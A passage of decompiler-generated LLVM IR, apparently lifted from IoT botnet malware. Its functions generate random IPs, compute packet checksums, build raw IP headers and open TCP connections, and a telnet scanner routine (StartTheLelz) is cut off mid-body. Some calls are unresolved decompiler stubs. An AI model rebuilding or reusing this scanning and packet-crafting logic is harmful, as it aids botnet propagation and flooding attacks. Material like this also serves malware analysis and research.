  uselistorder label %dec_label_pc_804a20f, { 1, 0 }
  uselistorder label %dec_label_pc_804a1d9, { 1, 0 }
  uselistorder label %dec_label_pc_804a1a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a16d, { 1, 0 }
  uselistorder label %dec_label_pc_804a137, { 1, 0 }
  uselistorder label %dec_label_pc_804a101, { 1, 0 }
  uselistorder label %dec_label_pc_804a0cb, { 1, 0 }
  uselistorder label %dec_label_pc_804a095, { 1, 0 }
  uselistorder label %dec_label_pc_804a05f, { 1, 0 }
  uselistorder label %dec_label_pc_804a029, { 1, 0 }
  uselistorder label %dec_label_pc_8049ff3, { 1, 0 }
  uselistorder label %dec_label_pc_8049fbd, { 1, 0 }
  uselistorder label %dec_label_pc_8049f87, { 1, 0 }
  uselistorder label %dec_label_pc_8049f51, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804cc35 = load i32, i32* @ebp, align 4
  store i32 %v0_804cc35, i32* %stack_var_-4, align 4
  %v0_804cc3b = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804cc43 = call i32 @ntohl(i32 %v0_804cc3b)
  %v5_804cc48 = and i32 %v1_804cc43, %arg1
  %v1_804cc4e = call i32 @rand_cmwc(i32 %v5_804cc48)
  %v1_804cc58 = sub i32 -1, %arg1
  %v2_804cc5a = and i32 %v1_804cc4e, %v1_804cc58
  %v5_804cc5c = xor i32 %v2_804cc5a, %v5_804cc48
  %v2_804cc5f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cc5f, i32* @ebp, align 4
  ret i32 %v5_804cc5c
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804cc66 = load i32, i32* @ebx, align 4
  %v4_804cc9533 = add i32 %arg2, -1
  %v9_804cc9534 = sub i32 0, %arg2
  %v10_804cc9535 = and i32 %arg2, %v9_804cc9534
  %v11_804cc9536 = icmp slt i32 %v10_804cc9535, 0
  %v12_804cc9537 = icmp eq i32 %v4_804cc9533, 0
  %v13_804cc9538 = icmp slt i32 %v4_804cc9533, 0
  %v3_804cc9939 = icmp eq i1 %v13_804cc9538, %v11_804cc9536
  %v4_804cc9940 = icmp eq i1 %v12_804cc9537, false
  %v5_804cc9941 = and i1 %v4_804cc9940, %v3_804cc9939
  br i1 %v5_804cc9941, label %dec_label_pc_804cc7a, label %dec_label_pc_804cc9b

dec_label_pc_804cc7a:                             ; preds = %entry, %dec_label_pc_804cc7a
  %stack_var_-24.045 = phi i16 [ %v9_804cc8a, %dec_label_pc_804cc7a ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804cc91, %dec_label_pc_804cc7a ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804cc8d, %dec_label_pc_804cc7a ], [ %arg1, %entry ]
  %v3_804cc8742 = phi i32 [ %v6_804cc87, %dec_label_pc_804cc7a ], [ 0, %entry ]
  %v4_804cc7a = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804cc7d = load i16, i16* %stack_var_4.043, align 2
  %v3_804cc7d = zext i16 %v2_804cc7d to i32
  %sext51 = mul i32 %v3_804cc8742, 65536
  %v4_804cc87 = sdiv i32 %sext51, 65536
  %v6_804cc87 = add nsw i32 %v3_804cc7d, %v4_804cc87
  %v11_804cc87 = icmp ult i32 %v6_804cc87, %v4_804cc87
  %v26_804cc87 = trunc i32 %v6_804cc87 to i16
  %v7_804cc8a = zext i1 %v11_804cc87 to i16
  %v9_804cc8a = add i16 %v7_804cc8a, %stack_var_-24.045
  %v5_804cc8d = add i32 %v4_804cc7a, 2
  %v23_804cc8d = inttoptr i32 %v5_804cc8d to i16*
  %v4_804cc91 = add i32 %stack_var_8.044, -2
  %v4_804cc95 = add i32 %stack_var_8.044, -3
  %v9_804cc95 = sub i32 2, %stack_var_8.044
  %v10_804cc95 = and i32 %v4_804cc91, %v9_804cc95
  %v11_804cc95 = icmp slt i32 %v10_804cc95, 0
  %v12_804cc95 = icmp eq i32 %v4_804cc95, 0
  %v13_804cc95 = icmp slt i32 %v4_804cc95, 0
  %v3_804cc99 = icmp eq i1 %v13_804cc95, %v11_804cc95
  %v4_804cc99 = icmp eq i1 %v12_804cc95, false
  %v5_804cc99 = and i1 %v4_804cc99, %v3_804cc99
  br i1 %v5_804cc99, label %dec_label_pc_804cc7a, label %dec_label_pc_804cc9b

dec_label_pc_804cc9b:                             ; preds = %dec_label_pc_804cc7a, %entry
  %v3_804cc87.lcssa = phi i16 [ 0, %entry ], [ %v26_804cc87, %dec_label_pc_804cc7a ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804cc8d, %dec_label_pc_804cc7a ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804cc91, %dec_label_pc_804cc7a ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804cc8a, %dec_label_pc_804cc7a ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804ccdc.preheader, label %dec_label_pc_804cca1

dec_label_pc_804cca1:                             ; preds = %dec_label_pc_804cc9b
  %v1_804cca4 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804cca4 = load i8, i8* %v1_804cca4, align 1
  %v3_804cca4 = zext i8 %v2_804cca4 to i32
  %v4_804ccaf = sext i16 %v3_804cc87.lcssa to i32
  %v6_804ccaf = add nsw i32 %v3_804cca4, %v4_804ccaf
  %v11_804ccaf = icmp ult i32 %v6_804ccaf, %v4_804ccaf
  %v26_804ccaf = trunc i32 %v6_804ccaf to i16
  %v7_804ccb2 = zext i1 %v11_804ccaf to i16
  %v9_804ccb2 = add i16 %v7_804ccb2, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804ccdc.preheader

dec_label_pc_804ccdc.preheader:                   ; preds = %dec_label_pc_804cca1, %dec_label_pc_804cc9b
  %v3_804ccc1.ph = phi i16 [ %v3_804cc87.lcssa, %dec_label_pc_804cc9b ], [ %v26_804ccaf, %dec_label_pc_804cca1 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804cc9b ], [ %v9_804ccb2, %dec_label_pc_804cca1 ]
  %v4_804ccdc20 = sext i16 %v3_804ccc1.ph to i32
  %v4_804ccdf21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804cce222 = udiv i32 %v4_804ccdc20, 65536
  %v4_804cce223 = mul i32 %v4_804ccdf21, 65536
  %v5_804cce224 = or i32 %v4_804cce223, %v3_804cce222
  %v2_804cce625 = udiv i32 %v4_804ccdf21, 65536
  %v2_804cce926 = or i32 %v5_804cce224, %v2_804cce625
  %v3_804cce927 = icmp eq i32 %v2_804cce926, 0
  %v1_804cced28 = icmp eq i1 %v3_804cce927, false
  br i1 %v1_804cced28, label %dec_label_pc_804ccb7, label %dec_label_pc_804ccef

dec_label_pc_804ccb7:                             ; preds = %dec_label_pc_804ccdc.preheader, %dec_label_pc_804ccb7
  %v2_804cce631 = phi i32 [ %v2_804cce6, %dec_label_pc_804ccb7 ], [ %v2_804cce625, %dec_label_pc_804ccdc.preheader ]
  %v5_804cce230 = phi i32 [ %v5_804cce2, %dec_label_pc_804ccb7 ], [ %v5_804cce224, %dec_label_pc_804ccdc.preheader ]
  %v4_804ccdc29 = phi i32 [ %v4_804ccdc, %dec_label_pc_804ccb7 ], [ %v4_804ccdc20, %dec_label_pc_804ccdc.preheader ]
  %v2_804ccd2 = add i32 %v5_804cce230, %v4_804ccdc29
  %v7_804ccd2 = icmp ult i32 %v2_804ccd2, %v4_804ccdc29
  %v3_804ccd4 = zext i1 %v7_804ccd2 to i32
  %v5_804ccd4 = add nuw nsw i32 %v3_804ccd4, %v2_804cce631
  %sext = mul i32 %v2_804ccd2, 65536
  %v4_804ccdc = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804ccd4, 65536
  %v4_804ccdf = sdiv i32 %sext50, 65536
  %v3_804cce2 = udiv i32 %v4_804ccdc, 65536
  %v5_804cce2 = or i32 %sext50, %v3_804cce2
  %v2_804cce6 = udiv i32 %v4_804ccdf, 65536
  %v2_804cce9 = or i32 %v5_804cce2, %v2_804cce6
  %v3_804cce9 = icmp eq i32 %v2_804cce9, 0
  %v1_804cced = icmp eq i1 %v3_804cce9, false
  br i1 %v1_804cced, label %dec_label_pc_804ccb7, label %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge

dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge: ; preds = %dec_label_pc_804ccb7
  br label %dec_label_pc_804ccef

dec_label_pc_804ccef:                             ; preds = %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge, %dec_label_pc_804ccdc.preheader
  %v4_804ccdc.lcssa = phi i32 [ %v4_804ccdc, %dec_label_pc_804ccdc.dec_label_pc_804ccef_crit_edge ], [ %v4_804ccdc20, %dec_label_pc_804ccdc.preheader ]
  %v1_804ccf3 = urem i32 %v4_804ccdc.lcssa, 65536
  %v1_804ccf5 = xor i32 %v1_804ccf3, 65535
  store i32 %v0_804cc66, i32* @ebx, align 4
  ret i32 %v1_804ccf5

; uselistorder directives
  uselistorder i32 %v5_804cce2, { 1, 0 }
  uselistorder i32 %v4_804ccdc, { 1, 0, 2 }
  uselistorder i32 %v2_804cce625, { 1, 0 }
  uselistorder i32 %v4_804ccdf21, { 1, 0 }
  uselistorder i32 %v4_804ccdc20, { 2, 1, 0 }
  uselistorder i32 %v4_804ccaf, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804cc87.lcssa, { 1, 0 }
  uselistorder i32 %v4_804cc95, { 1, 0 }
  uselistorder i32 %v4_804cc91, { 0, 2, 1 }
  uselistorder i32 %v6_804cc87, { 1, 2, 0 }
  uselistorder i32 %v4_804cc87, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb7, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7a, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd00 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd00, i32* %stack_var_-4, align 4
  %v4_804cd00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cd00, i32* @ebp, align 4
  %v1_804cd14 = add i32 %tmp10, 12
  %v2_804cd14 = inttoptr i32 %v1_804cd14 to i32*
  %v3_804cd14 = load i32, i32* %v2_804cd14, align 4
  %v1_804cd1d = add i32 %tmp10, 16
  %v2_804cd1d = inttoptr i32 %v1_804cd1d to i32*
  %v3_804cd1d = load i32, i32* %v2_804cd1d, align 4
  %v2_804cd32 = call i32 @htons(i16 20)
  %v1_804cd4b = call i32 @malloc(i32 32)
  store i32 %v1_804cd4b, i32* %ecx.global-to-local, align 4
  %v2_804cd5b = inttoptr i32 %v1_804cd4b to i32*
  store i32 %v3_804cd14, i32* %v2_804cd5b, align 4
  %v1_804cd60 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cd60 = add i32 %v1_804cd60, 4
  %v3_804cd60 = inttoptr i32 %v2_804cd60 to i32*
  store i32 %v3_804cd1d, i32* %v3_804cd60, align 4
  %v1_804cd66 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cd66 = add i32 %v1_804cd66, 8
  %v3_804cd66 = inttoptr i32 %v2_804cd66 to i32*
  store i32 0, i32* %v3_804cd66, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804cd6f = add i32 %v1_804cd4b, 12
  store i32 %v1_804cd6f, i32* %edx.global-to-local, align 4
  %v1_804cd72 = inttoptr i32 %tmp2 to i32*
  %v2_804cd72 = load i32, i32* %v1_804cd72, align 4
  %v2_804cd74 = inttoptr i32 %v1_804cd6f to i32*
  store i32 %v2_804cd72, i32* %v2_804cd74, align 4
  %v0_804cd76 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd76 = add i32 %v0_804cd76, 4
  %v2_804cd76 = inttoptr i32 %v1_804cd76 to i32*
  %v3_804cd76 = load i32, i32* %v2_804cd76, align 4
  %v1_804cd79 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd79 = add i32 %v1_804cd79, 4
  %v3_804cd79 = inttoptr i32 %v2_804cd79 to i32*
  store i32 %v3_804cd76, i32* %v3_804cd79, align 4
  %v0_804cd7c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd7c = add i32 %v0_804cd7c, 8
  %v2_804cd7c = inttoptr i32 %v1_804cd7c to i32*
  %v3_804cd7c = load i32, i32* %v2_804cd7c, align 4
  %v1_804cd7f = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd7f = add i32 %v1_804cd7f, 8
  %v3_804cd7f = inttoptr i32 %v2_804cd7f to i32*
  store i32 %v3_804cd7c, i32* %v3_804cd7f, align 4
  %v0_804cd82 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd82 = add i32 %v0_804cd82, 12
  %v2_804cd82 = inttoptr i32 %v1_804cd82 to i32*
  %v3_804cd82 = load i32, i32* %v2_804cd82, align 4
  %v1_804cd85 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd85 = add i32 %v1_804cd85, 12
  %v3_804cd85 = inttoptr i32 %v2_804cd85 to i32*
  store i32 %v3_804cd82, i32* %v3_804cd85, align 4
  %v0_804cd88 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd88 = add i32 %v0_804cd88, 16
  %v2_804cd88 = inttoptr i32 %v1_804cd88 to i32*
  %v3_804cd88 = load i32, i32* %v2_804cd88, align 4
  %v1_804cd8b = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd8b = add i32 %v1_804cd8b, 16
  %v3_804cd8b = inttoptr i32 %v2_804cd8b to i32*
  store i32 %v3_804cd88, i32* %v3_804cd8b, align 4
  %v2_804cd9b = inttoptr i32 %v1_804cd4b to i16*
  %v3_804cd9b = call i32 @csum(i16* %v2_804cd9b, i32 32)
  %v1_804cda0 = urem i32 %v3_804cd9b, 65536
  %v1_804cdad = call i32 @free(i32 %v1_804cd4b)
  %v2_804cdb6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cdb6, i32* @ebp, align 4
  ret i32 %v1_804cda0

; uselistorder directives
  uselistorder i32 %v1_804cd4b, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdb8 = load i32, i32* @ebp, align 4
  store i32 %v0_804cdb8, i32* %stack_var_-4, align 4
  %v4_804cdbe = sext i8 %tmp8 to i32
  %v4_804cdc4 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804cddf = add i32 %v4_804cdc4, 1
  %v2_804cddf = inttoptr i32 %v1_804cddf to i8*
  store i8 0, i8* %v2_804cddf, align 1
  %v1_804cde9 = add i32 %tmp5, 20
  %v1_804cdf2 = trunc i32 %v1_804cde9 to i16
  %v3_804cdf2 = add i32 %v4_804cdc4, 2
  %v4_804cdf2 = inttoptr i32 %v3_804cdf2 to i16*
  store i16 %v1_804cdf2, i16* %v4_804cdf2, align 2
  %v2_804cdf6 = call i32 @rand_cmwc(i32 %v4_804cdbe)
  %v1_804ce01 = trunc i32 %v2_804cdf6 to i16
  %v3_804ce01 = add i32 %v4_804cdc4, 4
  %v4_804ce01 = inttoptr i32 %v3_804ce01 to i16*
  store i16 %v1_804ce01, i16* %v4_804ce01, align 2
  %v1_804ce08 = add i32 %v4_804cdc4, 6
  %v2_804ce08 = inttoptr i32 %v1_804ce08 to i16*
  store i16 0, i16* %v2_804ce08, align 2
  %v1_804ce11 = add i32 %v4_804cdc4, 8
  %v2_804ce11 = inttoptr i32 %v1_804ce11 to i8*
  store i8 -1, i8* %v2_804ce11, align 1
  %v3_804ce1c = add i32 %v4_804cdc4, 9
  %v4_804ce1c = inttoptr i32 %v3_804ce1c to i8*
  store i8 %tmp8, i8* %v4_804ce1c, align 1
  %v1_804ce22 = add i32 %v4_804cdc4, 10
  %v2_804ce22 = inttoptr i32 %v1_804ce22 to i16*
  store i16 0, i16* %v2_804ce22, align 2
  %v2_804ce2e = add i32 %v4_804cdc4, 12
  %v3_804ce2e = inttoptr i32 %v2_804ce2e to i32*
  %v2_804ce37 = add i32 %v4_804cdc4, 16
  %v3_804ce37 = inttoptr i32 %v2_804ce37 to i32*
  store i32 %tmp, i32* %v3_804ce37, align 4
  %v2_804ce3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce3a, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804ce42 = add i32 %arg1, -2
  %v9_804ce42 = sub i32 1, %arg1
  %v10_804ce42 = and i32 %v9_804ce42, %arg1
  %v11_804ce42 = icmp slt i32 %v10_804ce42, 0
  %v12_804ce42 = icmp eq i32 %v4_804ce42, 0
  %v13_804ce42 = icmp slt i32 %v4_804ce42, 0
  %v3_804ce46 = icmp eq i1 %v13_804ce42, %v11_804ce42
  %v4_804ce46 = icmp eq i1 %v12_804ce42, false
  %v5_804ce46 = and i1 %v4_804ce46, %v3_804ce46
  br i1 %v5_804ce46, label %dec_label_pc_804ce51, label %dec_label_pc_804ce63

dec_label_pc_804ce51:                             ; preds = %entry
  %v1_804ce57 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804ce63

dec_label_pc_804ce63:                             ; preds = %entry, %dec_label_pc_804ce51
  %storemerge = phi i32 [ 0, %dec_label_pc_804ce51 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804ce42, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ce63, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce68 = load i32, i32* @ebp, align 4
  store i32 %v0_804ce68, i32* %stack_var_-4, align 4
  %v4_804ce68 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ce68, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804ce82 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804ce8a = icmp eq i32 %v1_804ce82, 0
  %v1_804ce8e = icmp eq i1 %v4_804ce8a, false
  br i1 %v1_804ce8e, label %dec_label_pc_804ce9c, label %dec_label_pc_804cf61

dec_label_pc_804ce9c:                             ; preds = %entry
  %v1_804ce9f = add i32 %v1_804ce82, 12
  %v2_804ce9f = inttoptr i32 %v1_804ce9f to i32*
  %v3_804ce9f = load i32, i32* %v2_804ce9f, align 4
  %v1_804cea7 = add i32 %v1_804ce82, 16
  %v2_804cea7 = inttoptr i32 %v1_804cea7 to i32*
  %v3_804cea7 = load i32, i32* %v2_804cea7, align 4
  %v1_804ceaa = inttoptr i32 %v3_804cea7 to i32*
  %v2_804ceaa = load i32, i32* %v1_804ceaa, align 4
  %v15_804ceb3 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804cebd = call i32 @bcopy(i32 %v2_804ceaa, i32 %v15_804ceb3, i32 %v3_804ce9f)
  %v2_804cec9 = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804cef2 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804cefa = ptrtoint i32* %stack_var_-32 to i32
  %v5_804cf1f = call i32 @__GI_setsockopt(i32 %v3_804cef2, i32 6, i32 1, i32 %v2_804cefa, i32 4)
  %v13_804cf24 = icmp eq i32 %v3_804cef2, -1
  %v1_804cf28 = icmp eq i1 %v13_804cf24, false
  br i1 %v1_804cf28, label %dec_label_pc_804cf33, label %dec_label_pc_804cf61

dec_label_pc_804cf33:                             ; preds = %dec_label_pc_804ce9c
  %v2_804ceb0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804cf48 = call i32 @__libc_connect(i32 %v3_804cef2, i32 %v2_804ceb0, i32 16)
  %v10_804cf4d = icmp eq i32 %v3_804cf48, -1
  %v1_804cf50 = icmp eq i1 %v10_804cf4d, false
  br i1 %v1_804cf50, label %dec_label_pc_804cf5b, label %dec_label_pc_804cf61

dec_label_pc_804cf5b:                             ; preds = %dec_label_pc_804cf33
  br label %dec_label_pc_804cf61

dec_label_pc_804cf61:                             ; preds = %dec_label_pc_804cf33, %dec_label_pc_804ce9c, %entry, %dec_label_pc_804cf5b
  %stack_var_-44.0 = phi i32 [ %v3_804cef2, %dec_label_pc_804cf5b ], [ 0, %entry ], [ 0, %dec_label_pc_804ce9c ], [ 0, %dec_label_pc_804cf33 ]
  %v2_804cf64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf64, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804cef2, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804cf61, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804cf7f = call i32 @__GI_time(i32* null)
  store i32 %v2_804cf7f, i32* %eax.global-to-local, align 4
  store i32 %v2_804cf7f, i32* @ebx, align 4
  %v1_804cf86 = call i32 @rand_cmwc(i32 0)
  %v1_804cf8b = load i32, i32* @ebx, align 4
  %v2_804cf8b = xor i32 %v1_804cf8b, %v1_804cf86
  store i32 %v2_804cf8b, i32* @eax, align 4
  %v1_804cf90 = call i32 @srand(i32 %v2_804cf8b)
  store i32 %v1_804cf90, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804cfa5 = call i32 @htons(i16 23)
  %v2_804cfb4 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804cfba = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804cfba, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804cfd1 = call i32 @malloc(i32 513)
  store i32 %v1_804cfd1, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804cff2 = inttoptr i32 %v1_804cfd1 to i8*
  %v4_804cff2 = call i32 @__GI_memset(i8* %v3_804cff2, i32 0, i32 513)
  %v2_804d008 = mul i32 %arg2, 28
  %v1_804d00d = add i32 %v2_804d008, 30
  %v2_804d010 = and i32 %v1_804d00d, -16
  %v0_804d016 = load i32, i32* @esp, align 4
  %v2_804d016 = sub i32 %v0_804d016, %v2_804d010
  %v1_804d028 = add i32 %v2_804d016, 35
  %v2_804d02b = and i32 %v1_804d028, -16
  %v2_804d048 = mul i32 %arg2, 5
  store i32 %v2_804d048, i32* %edx.global-to-local, align 4
  %v1_804d04e = inttoptr i32 %v2_804d02b to i8*
  store i32 %v2_804d02b, i32* @edi, align 4
  %v1_804d053 = and i32 %v1_804d028, -256
  store i32 %v1_804d053, i32* %eax.global-to-local, align 4
  %v5_804d055 = call i8* @_memset(i8* %v1_804d04e, i32 %v1_804d053, i32 %v2_804d048)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804d0e258 = icmp sgt i32 %arg2, 0
  br i1 %v5_804d0e258, label %dec_label_pc_804d060.lr.ph, label %dec_label_pc_804d0ef

dec_label_pc_804d060.lr.ph:                       ; preds = %entry
  %v2_804d0b4 = or i32 %v2_804d02b, 9
  br label %dec_label_pc_804d060

dec_label_pc_804d060:                             ; preds = %dec_label_pc_804d060, %dec_label_pc_804d060.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804d060.lr.ph ], [ %v4_804d0d9, %dec_label_pc_804d060 ]
  %v2_804d074 = mul i32 %storemerge259, 28
  %v2_804d076 = add i32 %v2_804d074, %v2_804d02b
  store i32 %v2_804d076, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d07e = inttoptr i32 %v2_804d076 to i32*
  store i32 0, i32* %v2_804d07e, align 4
  %v0_804d080 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d080 = add i32 %v0_804d080, 4
  store i32 %v1_804d080, i32* %eax.global-to-local, align 4
  %v0_804d083 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d083 = inttoptr i32 %v1_804d080 to i32*
  store i32 %v0_804d083, i32* %v2_804d083, align 4
  %v0_804d085 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d085 = add i32 %v0_804d085, 4
  store i32 %v1_804d085, i32* %eax.global-to-local, align 4
  %v0_804d088 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d088 = inttoptr i32 %v1_804d085 to i32*
  store i32 %v0_804d088, i32* %v2_804d088, align 4
  %v0_804d08a = load i32, i32* %eax.global-to-local, align 4
  %v1_804d08a = add i32 %v0_804d08a, 4
  store i32 %v1_804d08a, i32* %eax.global-to-local, align 4
  %v0_804d08d = load i32, i32* %edx.global-to-local, align 4
  %v2_804d08d = inttoptr i32 %v1_804d08a to i32*
  store i32 %v0_804d08d, i32* %v2_804d08d, align 4
  %v0_804d08f = load i32, i32* %eax.global-to-local, align 4
  %v1_804d08f = add i32 %v0_804d08f, 4
  store i32 %v1_804d08f, i32* %eax.global-to-local, align 4
  %v0_804d092 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d092 = inttoptr i32 %v1_804d08f to i32*
  store i32 %v0_804d092, i32* %v2_804d092, align 4
  %v0_804d094 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d094 = add i32 %v0_804d094, 4
  store i32 %v1_804d094, i32* %eax.global-to-local, align 4
  %v0_804d097 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d097 = inttoptr i32 %v1_804d094 to i32*
  store i32 %v0_804d097, i32* %v2_804d097, align 4
  %v0_804d099 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d099 = add i32 %v0_804d099, 4
  %v0_804d09c = load i32, i32* %edx.global-to-local, align 4
  %v2_804d09c = inttoptr i32 %v1_804d099 to i32*
  store i32 %v0_804d09c, i32* %v2_804d09c, align 4
  %v3_804d0b4 = add i32 %v2_804d0b4, %v2_804d074
  %v4_804d0b4 = inttoptr i32 %v3_804d0b4 to i8*
  store i8 1, i8* %v4_804d0b4, align 1
  %v1_804d0d1 = add i32 %v2_804d076, 24
  store i32 %v1_804d0d1, i32* %edx.global-to-local, align 4
  %v2_804d0d7 = inttoptr i32 %v1_804d0d1 to i32*
  store i32 %v1_804cfd1, i32* %v2_804d0d7, align 4
  %v4_804d0d9 = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804d0d9, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804d0d9, %arg2
  br i1 %exitcond60, label %dec_label_pc_804d0ef, label %dec_label_pc_804d060

dec_label_pc_804d0ef:                             ; preds = %entry, %dec_label_pc_804d060, %dec_label_pc_804d0ef
  %stack_var_-48.0 = phi i32 [ %v4_804d0ef, %dec_label_pc_804d0ef ], [ 0, %dec_label_pc_804d060 ], [ 0, %entry ]
  %v4_804d0ef = add i32 %stack_var_-48.0, 1
  store i32 %v4_804d0ef, i32* %eax.global-to-local, align 4
  %v1_804d0f5 = mul i32 %v4_804d0ef, 4
  %v2_804d0f5 = add i32 %v1_804d0f5, ptrtoint ([10 x i8*]* @global_var_805b1e0.246 to i32)
  %v3_804d0f5 = inttoptr i32 %v2_804d0f5 to i32*
  %v4_804d0f5 = load i32, i32* %v3_804d0f5, align 4
  store i32 %v4_804d0f5, i32* %eax.global-to-local, align 4
  %v1_804d0fc = icmp eq i32 %v4_804d0f5, 0
  %v1_804d0fe = icmp eq i1 %v1_804d0fc, false
  br i1 %v1_804d0fe, label %dec_label_pc_804d0ef, label %dec_label_pc_804d100.preheader

dec_label_pc_804d100.preheader:                   ; preds = %dec_label_pc_804d0ef
  %v2_804d550 = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804d5d0 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804d636 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804d170 = or i32 %v2_804d02b, 8
